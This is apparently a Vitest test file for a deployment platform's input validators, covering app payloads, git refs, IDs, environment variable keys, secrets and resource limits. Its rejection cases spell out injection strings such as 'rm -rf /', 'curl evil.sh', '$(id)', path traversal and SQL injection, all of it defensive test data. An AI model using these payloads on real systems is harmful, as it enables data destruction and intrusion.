import { describe, it, expect } from 'vitest';
import {
  createAppSchema,
  deployAppSchema,
  isValidId,
  setEnvVarSchema,
  setSecretSchema,
  resourceLimitsSchema,
  buildConfigSnapshot,
} from './validation.js';

describe('validation', () => {
  it('accepts valid app payloads', () => {
    const ok = createAppSchema.safeParse({ name: 'my-api', repositoryUrl: 'https://github.com/example/my-api' });
    expect(ok.success).toBe(true);
    const ok2 = createAppSchema.safeParse({ name: 'a1', repositoryUrl: 'git@github.com:example/repo.git' });
    expect(ok2.success).toBe(true);
  });

  it('rejects bad names and URLs', () => {
    expect(createAppSchema.safeParse({ name: '-bad', repositoryUrl: 'https://github.com/a/b' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: '', repositoryUrl: 'https://github.com/a/b' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'file:///etc/passwd' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'http://github.com/a/b' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'not a url' }).success).toBe(false);
    // command injection attempts in URLs must be rejected
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'https://github.com/a/b; rm -rf /' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'https://github.com/a/b && curl evil.sh' }).success).toBe(false);
  });

  it('validates deploy options strictly', () => {
    expect(deployAppSchema.safeParse({}).success).toBe(true);
    expect(deployAppSchema.safeParse({ ref: 'main' }).success).toBe(true);
    expect(deployAppSchema.safeParse({ ref: 'release/v1.2.3' }).success).toBe(true);
    expect(deployAppSchema.safeParse({ ref: 'main; echo pwned' }).success).toBe(false);
    expect(deployAppSchema.safeParse({ healthPath: '/healthz' }).success).toBe(true);
    expect(deployAppSchema.safeParse({ healthPath: 'health' }).success).toBe(false);
    expect(deployAppSchema.safeParse({ containerPort: 70000 }).success).toBe(false);
    expect(deployAppSchema.safeParse({ containerPort: 3000, extra: true }).success).toBe(false);
  });

  it('validates ids as uuids to prevent traversal/injection', () => {
    expect(isValidId('6f1c2b3a-1111-4222-8333-444455556666')).toBe(true);
    expect(isValidId('../../etc/passwd')).toBe(false);
    expect(isValidId('abc')).toBe(false);
    expect(isValidId("'; drop table apps; --")).toBe(false);
  });

  it('validates env var and secret keys strictly', () => {
    expect(setEnvVarSchema.safeParse({ key: 'DATABASE_URL', value: 'postgres://x' }).success).toBe(true);
    expect(setEnvVarSchema.safeParse({ key: '_private', value: '' }).success).toBe(true);
    // shell/PATH injection attempts and malformed keys
    expect(setEnvVarSchema.safeParse({ key: 'LD_PRELOAD', value: 'x' }).success).toBe(true);
    expect(setEnvVarSchema.safeParse({ key: 'A=B', value: 'x' }).success).toBe(false);
    expect(setEnvVarSchema.safeParse({ key: '1BAD', value: 'x' }).success).toBe(false);
    expect(setEnvVarSchema.safeParse({ key: 'HAS SPACE', value: 'x' }).success).toBe(false);
    expect(setEnvVarSchema.safeParse({ key: 'A;rm -rf /', value: 'x' }).success).toBe(false);
    expect(setEnvVarSchema.safeParse({ key: '$(id)', value: 'x' }).success).toBe(false);
    expect(setEnvVarSchema.safeParse({ key: 'a'.repeat(129), value: 'x' }).success).toBe(false);
    expect(setEnvVarSchema.safeParse({ key: 'KEY', value: 'v'.repeat(8193) }).success).toBe(false);
    // strict objects reject unknown fields
    expect(setEnvVarSchema.safeParse({ key: 'K', value: 'v', isSecret: true }).success).toBe(false);
    expect(setSecretSchema.safeParse({ key: 'API_TOKEN', value: 't0p' }).success).toBe(true);
    expect(setSecretSchema.safeParse({ key: 'no spaces', value: 'x' }).success).toBe(false);
  });

  it('validates resource limits with hard bounds', () => {
    expect(resourceLimitsSchema.safeParse({ memoryLimitMb: 256 }).success).toBe(true);
    expect(resourceLimitsSchema.safeParse({ cpuLimit: 1.5 }).success).toBe(true);
    expect(resourceLimitsSchema.safeParse({ memoryLimitMb: 512, cpuLimit: 0.5 }).success).toBe(true);
    // bounds
    expect(resourceLimitsSchema.safeParse({ memoryLimitMb: 8 }).success).toBe(false);
    expect(resourceLimitsSchema.safeParse({ memoryLimitMb: 65537 }).success).toBe(false);
    expect(resourceLimitsSchema.safeParse({ cpuLimit: 0.05 }).success).toBe(false);
    expect(resourceLimitsSchema.safeParse({ cpuLimit: 65 }).success).toBe(false);
    // types
    expect(resourceLimitsSchema.safeParse({ memoryLimitMb: 12.5 }).success).toBe(false);
    expect(resourceLimitsSchema.safeParse({ memoryLimitMb: '256' }).success).toBe(false);
    expect(resourceLimitsSchema.safeParse({}).success).toBe(false);
    expect(resourceLimitsSchema.safeParse({ extra: true }).success).toBe(false);
  });

  it('builds snapshots that carry secret keys but never secret values', () => {
    const snap = buildConfigSnapshot({ PLAIN: 'visible' }, ['SECRET_ONE', 'A_TOKEN'], { cpuLimit: 2 });
    expect(snap.env).toEqual({ PLAIN: 'visible' });
    expect(snap.secretKeys).toEqual(['A_TOKEN', 'SECRET_ONE']); // sorted
    expect(snap.limits).toEqual({ cpuLimit: 2 });
    expect(JSON.stringify(snap)).not.toContain('swordfish');
    const snapNoLimits = buildConfigSnapshot({}, [], null);
    expect(snapNoLimits.limits).toBeNull();
  });
});
